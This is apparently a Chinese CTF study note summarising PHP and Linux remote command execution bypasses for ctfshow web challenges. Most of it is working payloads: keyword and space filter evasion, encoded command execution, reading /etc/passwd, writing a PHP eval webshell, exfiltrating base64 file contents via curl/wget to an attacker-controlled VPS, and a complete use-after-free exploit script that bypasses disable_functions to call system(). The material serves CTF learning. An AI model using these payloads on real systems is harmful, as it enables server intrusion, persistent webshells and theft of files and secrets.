[TOC]



## RCE(命令、代码执行)总结



### 1、过滤cat、flag等关键字

#### 1.1 常见linux系统命令

```shell
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
strings
rev
```

#### 1.2 使用转义符

```shell
ca\t fl\ag ;
```

#### 1.3 使用引号

```shell
ca''t  fl''ag;
```

#### 1.4 内联执行绕过

拼接 `flag`

```php
?code=a=ag;b=fl;cat $b$a;   //相当于 cat flag
```

第二种:

```php
//当前目录下有 index.php、flag.php
cat `ls`;
//相当于 cat index.php;cat flag.php, 将ls命令的结果给cat去执行
```



#### 1.5 编码绕过

**base64编码**

```php
[root~]# echo 'cat flag.txt' | base64
Y2F0IGZsYWcudHh0Cg==
[root~]# echo Y2F0IGZsYWcudHh0Cg== | base64 -d
cat flag.txt
    
[root~]# echo Y2F0IGZsYWcudHh0Cg== | base64 -d | sh
flag{flag_is_here}
[root~]# echo Y2F0IGZsYWcudHh0Cg== | base64 -d | bash
flag{flag_is_here}
```



#### 1.6 进制绕过

**16进制**

```php
[root~]# echo cat flag.txt | xxd 
6361 7420 666c 6167 2e74 7874 0a
[root~]# echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p
cat flag.txt
[root~]# echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p | bash  或 | sh
flag{flag_is_here}


[root~]# $(printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74")  //cat flag.txt 16进制
flag{flag_is_here}
```



**8进制**

```php
[root~]# $(printf "\143\141\164\40\146\154\141\147\56\164\170\164")  
flag{flag_is_here}
```



#### 1.7 过滤文件名(如： /etc/passwd文件)

```php
1) 利用正则匹配绕过

[root~]# cat /???/pass*

2) 例如过滤/etc/passwd中的etc，利用未初始化变量，使用$u绕过

[root~]# cat /etc$u/passwd
```



#### 1.8 使用`$*`和`$@`，`$x`,`${x}`

![在这里插入图片描述](https://s2.loli.net/2022/12/26/Z5yPHrl731gNX9z.png)



#### 1.9 读取文件命令

```php
curl file:///root/Desktop/flag.txt
strings flag.txt
uniq -c/etc/passwd
bash -v /etc/passwd
rev /etc/passwd
sort flag.txt
```

<img src="https://s2.loli.net/2022/12/27/9rAZEXSnukCjUyP.png" alt="image-20221227000353472" style="zoom: 33%;" />

#### 1.10 查找文件命令(find)

```shell
# find . -name f*   //查找当前目录下f开头的文件
./flag.txt
```





### 2、rce常见php函数

```php
system()  执行命令
passthru()
exec()
shell_exec()
popen()
pcntl_exec()
反引号  同shell_exec()
eval()  执行命令
show_source() 高亮显示文件
highlight_file()  高亮显示文件
array_reverse()  反向输出元素
pos()  输出当前元素的值
localeconv()  返回一包含本地数字及货币格式信息的数组
include  一般用于括号被过滤的情况，因为可以不用括号
require  一般用于括号被过滤的情况，因为可以不用括号
echo()  输出
next()  下一个元素
```



### 3、rce常见linux系统命令

```php
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
strings
rev	反过来输出文件内容
```



### 4、过滤空格

- %09（url传递）(`cat%09flag.php`)
- ${IFS}
- $IFS$9
- <>（`cat<>/flag`）
- <（`cat</flag`）      输入重定向
- {cat,flag}

在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令

```bash
eg.
{ls,}
{cat,flags}
{mv,flags,flag}
```





### 5、过滤目录分隔符 /

```php
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/\//", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```

采用多个命令即可

```php
/?ip=;cd flag_is_here;cat f*;
```





### 6、过滤分隔符 ;

1，可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号

> 功能		符号		payload
> 换行符	%0a		?cmd=123%0als
> 回车符	%0d		?cmd=123%0dls
> 连续指令	;			?1=123;pwd
> 后台进程	&		?1=123&pwd
> 管道		|				?1=123|pwd
> 逻辑运算	||或&&	?1=123&&pwd
>

```php
;	//分号
|	//把前面输出的当作后面的输入 (管道符)
||	//前面为假才执行后面的指令
&	//两条命令都会执行
&&	//前面为假，后面不执行
```



2，`?>`代替`;`

在php中可以用`?>`来代替最后一个`;`因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。
例题：ctfshow-web入门36

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
}else{
    highlight_file(__FILE__);
}
```

这道题过滤了分号，直接用?>来代替分号

```php
include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```



### 7、shell_exec等无回显函数

复制，压缩，写shell等方法

```php
copy flag.php 1.txt		//复制
mv flag.php flag.txt	//改名
cat flag.php > flag.txt
tar cvf flag.tar flag.php	//压缩
tar zcvf flag.tar.gz flag.php
echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps > webshell.php 
echo "<?php @eval(\$_POST[123]); ?>" > webshell.php	//写入webshell
```



**在vps上建立记录脚本**

在自己的公网服务器站点根目录写入php文件，内容如下：
record.php

```php
<?php
$data =$_GET['data'];
$f = fopen("flag.txt", "w");
fwrite($f,$data);
fclose($f);
?>
```

在目标服务器的测试点可以发送下面其中任意一条请求进行测试

```php
curl http://*.*.*.**/record.php?data=`cat flag.php|base64`
wget http://*.*.*.*/record.php?data=`cat flag.php|base64`
```



#### >/dev/null 2>&1类无回显

ctfshow-web入门42-wp



### 8、无数字字母getshell

异或、取反、自增、或、上传临时文件





### 9、过滤括号

**使用不需要括号的函数**

```php
echo `cat /flag` 
```

- require、include

  ```php
  require '/flag'
  include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
  ```



**可以取反两次**

```php
<?=require~~flag.txt?>
<?=require~%d0%99%93%9e%98?> 
```



### 10、无参数RCE

#### get_defined_vars()

> 返回由所有已定义变量所组成的数组

#### session_id()

> 可以获取PHPSESSID的值

[无参数RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)

![在这里插入图片描述](https://s2.loli.net/2022/12/27/tbqwIA7fRl8mFnU.png)

读取目录：

```php
print_r(scandir(current(localeconv())));
print_r(scandir(pos(localeconv())));
print_r(scandir(dirname(__FILE__)));
```



### 11、内联执行

```php
echo `ls`;
echo $(ls);
?><?=`ls`;
?><?=$(ls);
```

![在这里插入图片描述](https://s2.loli.net/2022/12/27/RY4JmCADscxKjGi.png)

将``或$()内命令的输出作为输入执行



### 12、open_basedir绕过

**glob伪协议：**

```php
<?php
// 循环 ext/spl/examples/ 目录里所有 *.php 文件
// 并打印文件名和文件尺寸
$it = new DirectoryIterator("glob://ext/spl/examples/*.php");
foreach($it as $f) {
    printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
}
?>
```



**symlink()函数**



### 13、disable_function绕过



### 14、通配符+绝对路径调用命令

![在这里插入图片描述](https://s2.loli.net/2022/12/27/BziCvY1ENDhMFGX.png)

一些常用工具所在目录：

```php
/bin/cat
/bin/base64 flag.php    //base64编码flag.php的内容。
/usr/bin/bzip2 flag.php //将flag.php文件进行压缩，然后再将其下载。
    
/???/????64 ????.???  #/bin/base64 flag.php
/???/???/????2 ????.??? #/usr/bin/bzip2 flag.php
```

例题：ctfshow-web入门55





### 15、使用~$()构造数字

ctfshow-web入门57

```php
$(())=0
$((~$(())))=-1
```

![在这里插入图片描述](https://s2.loli.net/2022/12/27/waXI2Exb8dVoUNi.png)



### 16、 uaf脚本绕过disable_function

例题：ctfshow-web入门72

脚本如下：

```php
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
#需要通过url编码哦
```



### 17、反弹shell

...





## 参考文章

[rce总结](https://blog.csdn.net/qq_44657899/article/details/107676580)